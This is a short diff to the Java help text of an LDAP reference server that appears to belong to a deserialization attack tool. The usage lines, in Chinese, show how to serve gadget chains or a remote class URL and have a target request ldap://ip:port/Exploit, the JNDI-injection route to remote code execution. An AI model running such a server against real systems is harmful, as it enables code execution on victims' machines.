@@ -23,8 +23,8 @@ public class LDAPRefServer {
         System.out.println(" 使用：");
         System.out.println("【1】LDAP反序列化方式：java -jar LDAPUnserial-Tool.jar LDAP端口 base64/file base64编码后的链/序列化文件路径");
         System.out.println("【2】请求实例化Class方式：java -jar LDAPUnserial-Tool.jar LDAP端口 class http://xxx.xxx.xxx.xxx:xx/x.class");
-        System.out.println("客户端请求：ldap://ip:port/Exploit（名字随意）");
         System.out.println("【3】内置链：java -jar LDAPUnserial-Tool.jar LDAP端口 gadget -h");
+        System.out.println(" 客户端请求：ldap://ip:port/Exploit（名字随意）");
         System.out.println("------------------------------------------------------------------------");
         int ldap_port = Integer.valueOf(args[0]);
         String gadgetType = args[1];
